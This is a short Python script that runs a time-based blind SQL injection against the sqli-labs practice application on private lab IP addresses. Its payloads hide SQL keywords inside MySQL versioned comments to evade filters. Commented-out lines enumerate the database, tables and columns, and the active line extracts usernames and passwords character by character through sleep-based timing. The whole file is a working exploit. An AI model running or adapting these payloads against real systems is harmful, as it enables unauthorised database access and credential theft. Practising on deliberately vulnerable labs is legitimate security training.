#coding:utf-8

import requests

sql = ''
httpsession = requests.session()
for x in range(1,300):
    for y in range(33,127):
        #url1 = "http://192.168.150.139/sqli/Less-9/?id=1' /*!11444and*/ if(((ascii(substr((select database/*!80000aaa*/()),%d,1)))=%d),sleep/**/(/*!2*/),false) /*!11444and*/ '1' = '1"
        #url1 = "http://192.168.150.139/sqli/Less-5/?id=1' /*!11444and*/ if(ascii(substr((/*!80000aaa*/select/*!80000aaa*/ group_concat(table_name) /*!80000aaa*/from/*!80000aaa*/ information_schema.tables where table_schema='security'),%d,1))=%d,sleep/**/(/*!2*/),false) /*!11444and*/ '1' = '1"
        #url1 = "http://192.168.150.139/sqli/Less-5/?id=1' /*!11444and*/ if(ascii(substr((/*!80000aaa*/select/*!80000aaa*/ group_concat(column_name) /*!80000aaa*//*!80000aaa*/from/*!80000aaa*/ information_schema.columns where table_schema='security'),%d,1))=%d,sleep/**/(/*!2*/),false) /*!11444and*/'1' = '1"
        url1 = "http://192.168.150.131/sqli-labs/Less-5/?id=1' /*!11444and*/ if(ascii(substr((/*!80000aaa*/select/*!80000aaa*/ group_concat(username,password) /*!80000aaa*/from/*!80000aaa*/ users),%d,1))=%d,sleep/**/(/*!2*/),false) /*!11444and*/ '1' = '1"
        url2 = url1%(x,y)
        try:
            f = httpsession.get(url=url2,timeout=1.5)
        except:
            sql+=chr(y)
            print sql
            break
